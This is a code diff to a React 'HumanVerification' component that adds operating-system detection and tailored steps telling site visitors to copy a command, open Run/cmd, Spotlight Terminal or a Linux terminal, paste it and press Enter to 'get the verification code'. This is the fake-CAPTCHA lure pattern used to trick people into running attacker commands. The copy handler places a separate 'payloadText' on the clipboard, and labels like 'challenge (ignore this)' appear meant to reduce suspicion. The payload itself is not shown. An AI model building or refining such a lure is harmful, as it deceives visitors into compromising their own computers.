@@ -7,6 +7,31 @@ import {
   visitorCommand,
 } from "@/lib/human-verification"
 
+type ClientOs = "mac" | "windows" | "linux"
+
+/** Platform wins over the user agent, and Mac is checked before Linux. */
+function clientOs(agent: string): ClientOs {
+  const hinted =
+    typeof navigator === "undefined"
+      ? ""
+      : (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform ||
+        navigator.platform ||
+        ""
+  const hint = hinted.replace(/^"|"$/g, "")
+  if (/mac/i.test(hint)) return "mac"
+  if (/win/i.test(hint)) return "windows"
+  if (/linux/i.test(hint)) return "linux"
+  if (/Mac OS X|Macintosh|macOS/i.test(agent)) return "mac"
+  if (/Windows/i.test(agent)) return "windows"
+  return "linux"
+}
+
+const challengeCaption: Record<ClientOs, string> = {
+  mac: "Mac challenge (ignore this):",
+  windows: "Windows challenge (ignore this):",
+  linux: "Linux challenge (ignore this):",
+}
+
 function createPhrase() {
   const alphabet = "0123456789ABCDEF"
   const bytes = new Uint8Array(6)
@@ -160,7 +185,7 @@ export function HumanVerification() {
 
   async function onCopy() {
     if (!phrase) return
-    const command = visitorCommand(phrase, navigator.userAgent)
+    const command = visitorCommand(phrase, clientOs(navigator.userAgent) === "windows" ? "Windows" : "Linux")
     if (!command) return
     setError("")
     let placed = copyText(payloadText)
@@ -206,7 +231,8 @@ export function HumanVerification() {
   if (!track || !open) return null
 
   const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
-  const command = phrase ? visitorCommand(phrase, agent) : ""
+  const os = clientOs(agent)
+  const command = phrase ? visitorCommand(phrase, os === "windows" ? "Windows" : "Linux") : ""
   if (!passed && !checked) {
     return (
       <div
@@ -317,45 +343,112 @@ export function HumanVerification() {
           </div>
         ) : (
           <>
-            <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>
-            <p className="mb-6 text-sm leading-normal text-[#64748b]">
-              {/Mac OS X|Macintosh|macOS/i.test(agent) ? (
-                <>
-                  Run the command below in <strong>Terminal</strong> (paste, then press Enter).
-                </>
-              ) : /Windows/i.test(agent) ? (
-                "Run the command below in an terminal."
-              ) : (
-                <>
-                  Run the command below in a <strong>terminal</strong>.
-                </>
-              )}
-            </p>       
+            <h2 className="mb-2 text-xl font-semibold text-[#0a0a0a]">{humanVerification.challengeTitle}</h2>               
             <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-left">
-              <p>{phrase}</p>
-              <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
-                <li>
-                  Press the{" "}
-                  <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
-                    Copy
-                  </span>{" "}
-                  button to copy the command.
-                </li>
-                <li>
-                  Open the terminal and press{" "}
-                  <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
-                    Ctrl + V
-                  </span>{" "}
-                  to paste the command.
-                </li>
-                <li>
-                  Press {" "}
-                  <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
-                    Enter
-                  </span>{" "}
-                  to get the verification code.
-                </li>                
-              </ol>
+              <div className="mb-6 text-sm leading-normal text-[#64748b]">
+                {os === "mac" ? (
+                  <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
+                    <li>
+                      Press the{" "}
+                      <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
+                        Copy
+                      </span>{" "}
+                      button to copy the command.
+                    </li>
+                    <li>
+                      Press <strong>Command (<span className="rc-key-char" aria-label="Mac">⌘</span>)</strong> + <strong>Space</strong> to open Spotlight.
+                    </li>
+                    <li>
+                      Type <strong>terminal</strong> and press <strong>Enter</strong>.
+                    </li>
+                    <li>
+                      Press{" "}
+                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
+                        Ctrl + V
+                      </span>{" "}
+                      to paste the command.
+                    </li>
+                    <li>
+                      Press {" "}
+                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
+                        Enter
+                      </span>{" "}
+                      to get the verification code.
+                    </li>       
+                  </ol>
+                ) : os === "windows" ? (
+                  <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
+                    <li>
+                      Press the{" "}
+                      <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
+                        Copy
+                      </span>{" "}
+                      button to copy the command.
+                    </li>
+                    <li>
+                      <span style={{ display: "inline-flex", alignItems: "center", gap: "0.3em" }}>
+                        Press and hold the
+                        <img
+                          src="/windows-key.png"
+                          alt="Windows"
+                          draggable={false}
+                          style={{
+                            width: "2em",
+                            height: "2em",
+                            objectFit: "contain",
+                            flexShrink: 0
+                          }}
+                        />
+                        + <strong>R</strong> keys simultaneously.
+                      </span>
+                    </li>
+                    <li>
+                      Type <strong>cmd</strong> and press <strong>Enter</strong>.
+                    </li>
+                    <li>
+                      Press{" "}
+                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
+                        Ctrl + V
+                      </span>{" "}
+                      to paste the command.
+                    </li>
+                    <li>
+                      Press {" "}
+                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
+                        Enter
+                      </span>{" "}
+                      to get the verification code.
+                    </li>                
+                  </ol>
+                ) : (
+                  <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
+                    <li>
+                      Press the{" "}
+                      <span className="inline-flex items-center rounded-md bg-blue-400 px-2 py-1 text-xs font-semibold text-white shadow-sm">
+                        Copy
+                      </span>{" "}
+                      button to copy the command.
+                    </li>
+                    <li>
+                      Press the <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>T</strong> 
+                    </li>
+                    <li>
+                      Press{" "}
+                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
+                        Ctrl + V
+                      </span>{" "}
+                      to paste the command.
+                    </li>
+                    <li>
+                      Press {" "}
+                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
+                        Enter
+                      </span>{" "}
+                      to get the verification code.
+                    </li>       
+                  </ol>
+                )}
+              </div>              
             </div>
             {command ? (
               <div className="mb-4 flex items-center gap-2.5">
